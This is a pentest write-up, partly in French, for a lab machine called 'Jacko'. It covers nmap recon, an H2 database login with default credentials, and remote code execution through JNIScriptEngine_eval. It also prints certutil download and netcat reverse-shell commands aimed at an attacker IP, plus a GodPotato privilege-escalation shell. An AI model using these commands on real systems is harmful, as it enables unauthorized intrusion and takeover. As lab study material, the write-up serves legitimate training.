---
description: used https://github.com/felixbillieres/TemplateGenerator for the template
---

# Jacko

## Rapport de Pentest pour Jacko

### Informations de base

* **Nom de la box**: Jacko
* **Adresse IP**: 192.168.169.66
* **Date**: 3/22/2025

### Phases de Pentest

#### 1. Reconnaissance

* Scan Nmap initial: `nmap -sC -sV -oA initial 192.168.169.66`
* Scan complet: `nmap -p- --min-rate 10000 -oA full 192.168.169.66`
* Vérification des versions des services découverts

#### 2. Énumération

* Énumération des utilisateurs, groupes, et autres informations pertinentes
* Recherche de vulnérabilités connues pour les services identifiés

So we discovers some interesting services:

<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

So i look for known exploits of default creds ->

There were plenty of "default passwords" so i just tried one after another and eventually got in the system with username sa and no passwd:

<figure><img src="../../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

Then i look for authenticated exploits and found this:

{% embed url="https://www.exploit-db.com/exploits/49384" %}

#### 3. Exploitation

* Tentatives d'exploitation des vulnérabilités découvertes
* Obtention d'un premier accès à la cible

and after running some SQL commands i got what seemed to ba an RCE:

<figure><img src="../../../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

Then after trying plenty of stuff i found this article that seemed preety accurate:

{% embed url="https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2" %}

and i see some default commands in the [http://www.h2database.com/html/functions.html](http://www.h2database.com/html/functions.html)

Here is my process for getting netcat on the target and getting my reverse shell:

```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.210:80/nc.exe C:/Windows/Temp/nc.exe").getInputStream()).useDelimiter("\\Z").next()');
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/nc.exe 192.168.45.210 4444 -e cmd").getInputStream()).useDelimiter("\\Z").next()');
```

{% hint style="info" %}
Key takes:

try port 80

C:/Windows/Temp/ rather than C:/Temp/

for windows RS, put cmd and not sh -> nc.exe 192.168.45.210 4444 -e cmd
{% endhint %}

After i transfer winpeas to the target:

<figure><img src="../../../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

#### 4. Post-Exploitation

so i saw that i was very limited so i did part of my enumeration on the web interface and saw this:

<figure><img src="../../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

Sweet, so i need to download plenty of stuff to the machine:

{% embed url="https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070" %}

nc.exe

godpotato.exe

```
god.exe -cmd "C:\Users\tony\Desktop\nc.exe -e cmd.exe 192.168.45.210 9898"
```

<figure><img src="../../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

#### 5. Nettoyage

* Suppression des traces laissées sur la cible
* Documentation des vulnérabilités et méthodes d'exploitation
